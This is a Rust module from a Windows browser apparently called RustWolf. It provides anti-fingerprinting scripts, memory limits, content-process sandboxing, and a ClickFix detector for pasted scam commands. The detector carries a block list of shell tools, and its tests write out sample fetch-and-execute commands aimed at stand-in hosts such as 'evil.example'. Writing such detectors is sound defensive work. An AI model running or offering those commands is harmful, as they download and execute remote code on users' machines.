//! Protection for the user and their PC: fingerprint resistance (a script that runs before any
//! page code), a uniform browser identity, and a memory guard so a heavy site can't freeze Windows.

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

/// The identity every RustWolf reports: the most common desktop browser, so users blend in.
/// Exactly what Tor Browser 16 / Mullvad Browser (Firefox ESR 153 with resist-fingerprinting)
/// report on Windows, measured in Tor Browser itself. RustWolf's JavaScript engine is Firefox's
/// own (SpiderMonkey), so this identity is also the most consistent one.
pub const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0";
/// Tor Browser's timezone.
pub const TIMEZONE: &str = "Atlantic/Reykjavik";

/// Runs at the start of every page, before the page's own scripts.
pub fn fingerprint_script(seed: u32) -> String {
    let main = format!(
        r#"(() => {{
  const SEED = {seed};
  const def = (proto, key, get) => {{ try {{ Object.defineProperty(proto, key, {{ get, configurable: true }}); }} catch (e) {{}} }};
  // Same answers for everyone: hide the real CPU, memory, languages and platform.
  def(Navigator.prototype, 'hardwareConcurrency', () => 4);
  // Firefox has no navigator.deviceMemory at all.
  try {{ delete Navigator.prototype.deviceMemory; delete navigator.deviceMemory; }} catch (e) {{}}
  def(Navigator.prototype, 'oscpu', () => 'Windows NT 10.0; Win64; x64');
  def(Navigator.prototype, 'buildID', () => '20181001000000');
  def(Navigator.prototype, 'productSub', () => '20100101');
  def(Navigator.prototype, 'appVersion', () => '5.0 (Windows)');
  def(Navigator.prototype, 'language', () => 'en-US');
  def(Navigator.prototype, 'languages', () => Object.freeze(['en-US', 'en']));
  def(Navigator.prototype, 'platform', () => 'Win32');
  def(Navigator.prototype, 'vendor', () => '');
  def(Navigator.prototype, 'maxTouchPoints', () => 10);
  // Privacy signals.
  def(Navigator.prototype, 'globalPrivacyControl', () => true);
  def(Navigator.prototype, 'doNotTrack', () => 'unspecified');
  try {{ Object.defineProperty(window, 'devicePixelRatio', {{ get: () => 2, configurable: true }}); }} catch (e) {{}}
  // Timezone fallback, in case the engine still sees the PC's own zone.
  try {{
    const ro = Intl.DateTimeFormat.prototype.resolvedOptions;
    Intl.DateTimeFormat.prototype.resolvedOptions = function () {{ const o = ro.call(this); o.timeZone = 'Atlantic/Reykjavik'; return o; }};
  }} catch (e) {{}}
  // The screen is reported as the window size: no real resolution or multi-monitor setup.
  if (typeof Screen !== 'undefined') {{
    def(Screen.prototype, 'width', () => window.innerWidth);
    def(Screen.prototype, 'height', () => window.innerHeight);
    def(Screen.prototype, 'availWidth', () => window.innerWidth);
    def(Screen.prototype, 'availHeight', () => window.innerHeight);
    def(Screen.prototype, 'colorDepth', () => 24);
    def(Screen.prototype, 'pixelDepth', () => 24);
  }}
  // Canvas fingerprinting: add tiny invisible noise (different every session) to read-backs.
  const noise = (data) => {{
    let s = SEED;
    for (let i = 0; i < data.length; i += 4) {{
      s = (s * 1103515245 + 12345) >>> 0;
      if ((s & 31) === 0) {{ data[i] ^= (s >>> 8) & 1; data[i + 1] ^= (s >>> 9) & 1; }}
    }}
  }};
  if (typeof CanvasRenderingContext2D !== 'undefined') {{
    const gid = CanvasRenderingContext2D.prototype.getImageData;
    CanvasRenderingContext2D.prototype.getImageData = function (...a) {{
      const img = gid.apply(this, a);
      try {{ noise(img.data); }} catch (e) {{}}
      return img;
    }};
  }}
  if (typeof HTMLCanvasElement !== 'undefined') {{
    const noisy = (canvas) => {{
      try {{
        const c = document.createElement('canvas');
        c.width = canvas.width; c.height = canvas.height;
        const x = c.getContext('2d');
        x.drawImage(canvas, 0, 0);
        if (c.width && c.height) x.putImageData(x.getImageData(0, 0, c.width, c.height), 0, 0);
        return c;
      }} catch (e) {{ return canvas; }}
    }};
    const tdu = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function (...a) {{ return tdu.apply(noisy(this), a); }};
    if (HTMLCanvasElement.prototype.toBlob) {{
      const tb = HTMLCanvasElement.prototype.toBlob;
      HTMLCanvasElement.prototype.toBlob = function (...a) {{ return tb.apply(noisy(this), a); }};
    }}
  }}
  // Battery and other sensors: not available.
  try {{ delete Navigator.prototype.getBattery; }} catch (e) {{}}
}})();"#
    );
    main + TIMEZONE_SCRIPT
}

/// Page clocks run on Tor Browser's timezone (Atlantic/Reykjavik = UTC+0, no daylight saving):
/// local-time Date methods behave like their UTC versions, and Intl formats in that zone.
const TIMEZONE_SCRIPT: &str = r#"
(() => {
  const D = Date, P = D.prototype, TZ = 'Atlantic/Reykjavik';
  const realOffset = P.getTimezoneOffset;
  const pairs = ['FullYear', 'Month', 'Date', 'Day', 'Hours', 'Minutes', 'Seconds', 'Milliseconds'];
  for (const n of pairs) {
    if (P['getUTC' + n]) P['get' + n] = P['getUTC' + n];
    if (n !== 'Day' && P['setUTC' + n]) P['set' + n] = P['setUTC' + n];
  }
  P.getYear = function () { return this.getUTCFullYear() - 1900; };
  P.getTimezoneOffset = function () { return isNaN(this) ? NaN : 0; };
  const pad = (n) => String(n).padStart(2, '0');
  const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const dateStr = (d) => `${days[d.getUTCDay()]} ${months[d.getUTCMonth()]} ${pad(d.getUTCDate())} ${d.getUTCFullYear()}`;
  const timeStr = (d) => `${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} GMT+0000 (Greenwich Mean Time)`;
  P.toString = function () { return isNaN(this) ? 'Invalid Date' : dateStr(this) + ' ' + timeStr(this); };
  P.toDateString = function () { return isNaN(this) ? 'Invalid Date' : dateStr(this); };
  P.toTimeString = function () { return isNaN(this) ? 'Invalid Date' : timeStr(this); };
  for (const m of ['toLocaleString', 'toLocaleDateString', 'toLocaleTimeString']) {
    const orig = P[m];
    P[m] = function (locales, options) { return orig.call(this, locales, Object.assign({ timeZone: TZ }, options)); };
  }
  const DTF = Intl.DateTimeFormat;
  const FakeDTF = function (locales, options) { return new DTF(locales, Object.assign({ timeZone: TZ }, options)); };
  FakeDTF.prototype = DTF.prototype;
  FakeDTF.supportedLocalesOf = DTF.supportedLocalesOf;
  Intl.DateTimeFormat = FakeDTF;
  // Strings with a time but no timezone mean "local time" = UTC here.
  const localish = (s) => typeof s === 'string' && /\d:\d/.test(s) && !/(z|gmt|utc|[+-]\d\d:?\d\d)\s*$/i.test(s.trim());
  const fixParse = (s) => { const t = D.parse(s); return localish(s) && !isNaN(t) ? t - realOffset.call(new D(t)) * 60000 : t; };
  function FakeDate(...a) {
    if (!new.target) return new FakeDate().toString();
    if (a.length >= 2) return new D(D.UTC(...a));
    if (a.length === 1 && typeof a[0] === 'string') return new D(fixParse(a[0]));
    return new D(...a);
  }
  FakeDate.prototype = P;
  FakeDate.now = D.now;
  FakeDate.UTC = D.UTC;
  FakeDate.parse = fixParse;
  Object.defineProperty(P, 'constructor', { value: FakeDate, configurable: true, writable: true });
  window.Date = FakeDate;
})();
"#;

fn total_ram_mb() -> u64 {
    use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
    unsafe {
        let mut m: MEMORYSTATUSEX = std::mem::zeroed();
        m.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut m) != 0 {
            m.ullTotalPhys / (1024 * 1024)
        } else {
            8192
        }
    }
}

fn own_ram_mb() -> u64 {
    use windows_sys::Win32::System::ProcessStatus::{K32GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    unsafe {
        let mut c: PROCESS_MEMORY_COUNTERS = std::mem::zeroed();
        c.cb = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32;
        if K32GetProcessMemoryInfo(GetCurrentProcess(), &mut c, c.cb) != 0 {
            (c.WorkingSetSize / (1024 * 1024)) as u64
        } else {
            0
        }
    }
}

/// Last resort: Windows refuses RustWolf more than half of the PC's memory. If a page still
/// gets there, RustWolf closes instead of the whole PC freezing.
pub fn hard_memory_cap() {
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JOB_OBJECT_LIMIT_JOB_MEMORY, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, JOB_OBJECT_LIMIT_PROCESS_MEMORY, JOB_OBJECT_LIMIT_BREAKAWAY_OK,
    };
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    unsafe {
        let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
        if job.is_null() {
            return;
        }
        let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
        // Each process (the browser and every page process) gets at most 20% of the RAM,
        // and all of RustWolf together at most 40%.
        // BREAKAWAY_OK lets "Restart RustWolf" start the new copy outside this job.
        info.BasicLimitInformation.LimitFlags =
            JOB_OBJECT_LIMIT_JOB_MEMORY | JOB_OBJECT_LIMIT_PROCESS_MEMORY | JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE | JOB_OBJECT_LIMIT_BREAKAWAY_OK;
        info.ProcessMemoryLimit = (total_ram_mb() * 20 / 100 * 1024 * 1024) as usize;
        info.JobMemoryLimit = (total_ram_mb() * 40 / 100 * 1024 * 1024) as usize;
        SetInformationJobObject(job, JobObjectExtendedLimitInformation, &info as *const _ as *const _, std::mem::size_of_val(&info) as u32);
        AssignProcessToJobObject(job, GetCurrentProcess());
        // The job handle stays open for RustWolf's whole life.
    }
}

/// Working set of one process, in MB.
fn process_ram_mb(pid: u32) -> Option<u64> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::ProcessStatus::{K32GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
        if h.is_null() {
            return None;
        }
        let mut c: PROCESS_MEMORY_COUNTERS = std::mem::zeroed();
        c.cb = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32;
        let ok = K32GetProcessMemoryInfo(h, &mut c, c.cb) != 0;
        CloseHandle(h);
        ok.then(|| (c.WorkingSetSize / (1024 * 1024)) as u64)
    }
}

/// RustWolf's page processes (children of this process).
fn page_processes() -> Vec<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
    let me = std::process::id();
    let mut out = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return out;
        }
        let mut e: PROCESSENTRY32W = std::mem::zeroed();
        e.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                if e.th32ParentProcessID == me {
                    out.push(e.th32ProcessID);
                }
                if Process32NextW(snap, &mut e) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    out
}

fn kill(pid: u32) {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
    unsafe {
        let h = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if !h.is_null() {
            TerminateProcess(h, 1);
            CloseHandle(h);
        }
    }
}

/// Soft limit: a page process passing ~25% of the PC's memory is stopped at once (only that page);
/// in single-process mode the busiest page is closed instead.
pub struct MemoryGuard {
    pub limit_mb: u64,
    pub current_mb: Arc<AtomicU64>,
    /// Size of the last page process the guard stopped (0 = none).
    pub killed_mb: Arc<AtomicU64>,
}

impl MemoryGuard {
    pub fn start(wake: impl Fn() + Send + 'static) -> Self {
        let limit_mb = (total_ram_mb() / 6).clamp(1024, 2048);
        let current = Arc::new(AtomicU64::new(0));
        let killed = Arc::new(AtomicU64::new(0));
        let c = current.clone();
        let k = killed.clone();
        std::thread::Builder::new()
            .name("memory-guard".into())
            .spawn(move || loop {
                std::thread::sleep(Duration::from_millis(250));
                for pid in page_processes() {
                    if let Some(mb) = process_ram_mb(pid) {
                        if mb > limit_mb {
                            kill(pid);
                            k.store(mb, Ordering::Relaxed);
                            wake();
                        }
                    }
                }
                let mb = own_ram_mb();
                c.store(mb, Ordering::Relaxed);
                if mb > limit_mb {
                    wake();
                }
            })
            .ok();
        Self { limit_mb, current_mb: current, killed_mb: killed }
    }

    pub fn over(&self) -> bool {
        self.current_mb.load(Ordering::Relaxed) > self.limit_mb
    }
}

/// ClickFix protection: does this text look like a command a scam page wants you to paste into
/// Win+R / PowerShell / a terminal? (Normal copied text never matches.)
pub fn looks_like_command(text: &str) -> bool {
    let t = text.to_lowercase();
    let t = t.trim();
    if t.is_empty() {
        return false;
    }
    const STRONG: &[&str] = &[
        "powershell", "pwsh", "mshta", "rundll32", "regsvr32", "wscript", "cscript", "certutil", "bitsadmin",
        "invoke-expression", "invoke-webrequest", "invoke-restmethod", "downloadstring", "downloadfile",
        "frombase64string", "-encodedcommand", "start-process", "new-object net.webclient", "add-mppreference",
        "set-mppreference", "schtasks", "forfiles", "conhost", "cmd.exe", "cmd /c", "cmd /k", "%comspec%",
        "msiexec /i http", "msiexec /q", "curl -s", "| iex", "|iex", "| sh", "|sh", "| bash", "|bash",
        "osascript", "chmod +x", "base64 -d", "/dev/tcp/",
    ];
    if STRONG.iter().any(|k| t.contains(k)) {
        return true;
    }
    // Short aliases only count as words at the start of a command (avoids normal sentences).
    let first = t.split_whitespace().next().unwrap_or("");
    if ["iex", "iwr", "irm", "curl", "wget", "msiexec", "explorer", "cmd", "start", "net", "reg"].contains(&first)
        && (t.contains("http") || t.contains('\\') || t.contains(" /") || t.contains(" -"))
    {
        return true;
    }
    // Typical ClickFix decoy comment: "# ✅ I am not a robot - Verification ID: 1234".
    if t.contains('#') && (t.contains("not a robot") || t.contains("verification id") || t.contains("captcha")) {
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::looks_like_command as c;
    #[test]
    fn clickfix() {
        assert!(c("powershell -w hidden -c \"iwr http://evil/x.ps1 | iex\" # ✅ I am not a robot - Verification ID: 4821"));
        assert!(c("mshta https://evil.example/verify.hta"));
        assert!(c("cmd /c start /min powershell -enc SQBFAFgA"));
        assert!(c("curl -s http://x.example/a.sh | bash"));
        assert!(!c("Hello, here is my email address"));
        assert!(!c("https://example.com/article?id=3"));
        assert!(!c("The command line is a text interface."));
    }
}

/// Sandbox for page (content) processes, applied by each page process before it runs any web
/// content:
/// - it is put in its own Windows job that forbids starting any other program (a hacked page
///   can't launch PowerShell or malware) and blocks desktop / clipboard / system-setting access;
/// - Windows exploit mitigations are switched on: no DLL injection through legacy extension
///   points, no DLLs loaded from network shares or low-integrity files, strict handle checks,
///   and (in hardened mode, where the JIT is off) no creation of executable code at all.
pub fn lockdown_content_process(hardened: bool) {
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JobObjectBasicUIRestrictions, SetInformationJobObject,
        JOBOBJECT_BASIC_UI_RESTRICTIONS, JOB_OBJECT_LIMIT_ACTIVE_PROCESS,
        JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION, JOB_OBJECT_UILIMIT_DESKTOP, JOB_OBJECT_UILIMIT_DISPLAYSETTINGS,
        JOB_OBJECT_UILIMIT_EXITWINDOWS, JOB_OBJECT_UILIMIT_GLOBALATOMS, JOB_OBJECT_UILIMIT_HANDLES, JOB_OBJECT_UILIMIT_READCLIPBOARD,
        JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS, JOB_OBJECT_UILIMIT_WRITECLIPBOARD,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, ProcessDynamicCodePolicy, ProcessExtensionPointDisablePolicy, ProcessImageLoadPolicy,
        ProcessStrictHandleCheckPolicy, SetProcessMitigationPolicy,
    };
    unsafe {
        let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
        if !job.is_null() {
            let mut ext: windows_sys::Win32::System::JobObjects::JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
            ext.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_ACTIVE_PROCESS | JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
            ext.BasicLimitInformation.ActiveProcessLimit = 1; // only this process: no child processes
            let ok1 = SetInformationJobObject(
                job,
                windows_sys::Win32::System::JobObjects::JobObjectExtendedLimitInformation,
                &ext as *const _ as *const _,
                std::mem::size_of_val(&ext) as u32,
            );
            let err1 = windows_sys::Win32::Foundation::GetLastError();
            let ui = JOBOBJECT_BASIC_UI_RESTRICTIONS {
                UIRestrictionsClass: JOB_OBJECT_UILIMIT_DESKTOP
                    | JOB_OBJECT_UILIMIT_DISPLAYSETTINGS
                    | JOB_OBJECT_UILIMIT_EXITWINDOWS
                    | JOB_OBJECT_UILIMIT_GLOBALATOMS
                    | JOB_OBJECT_UILIMIT_HANDLES
                    | JOB_OBJECT_UILIMIT_READCLIPBOARD
                    | JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS
                    | JOB_OBJECT_UILIMIT_WRITECLIPBOARD,
            };
            let ok2 = SetInformationJobObject(job, JobObjectBasicUIRestrictions, &ui as *const _ as *const _, std::mem::size_of_val(&ui) as u32);
            let ok3 = AssignProcessToJobObject(job, GetCurrentProcess());
            if std::env::var_os("RUSTWOLF_SANDBOX_TEST").is_some() {
                eprintln!(
                    "[sandbox] job limits={} (error {}) ui={} assign={}",
                    ok1,
                    err1,
                    ok2,
                    ok3
                );
            }
        }
        let set = |policy, flags: u32| {
            SetProcessMitigationPolicy(policy, &flags as *const u32 as *const _, 4);
        };
        set(ProcessExtensionPointDisablePolicy, 0b1); // DisableExtensionPoints
        set(ProcessImageLoadPolicy, 0b111); // NoRemoteImages | NoLowMandatoryLabelImages | PreferSystem32Images
        set(ProcessStrictHandleCheckPolicy, 0b11); // RaiseExceptionOnInvalidHandleReference | permanent
        if hardened {
            set(ProcessDynamicCodePolicy, 0b1); // ProhibitDynamicCode (JIT is off in hardened mode)
        }
    }
}

/// Is this process really locked down? (Used by the tests and the shield panel.)
pub fn job_forbids_child_processes() -> bool {
    std::process::Command::new("cmd.exe").arg("/c").arg("exit").spawn().is_err()
}
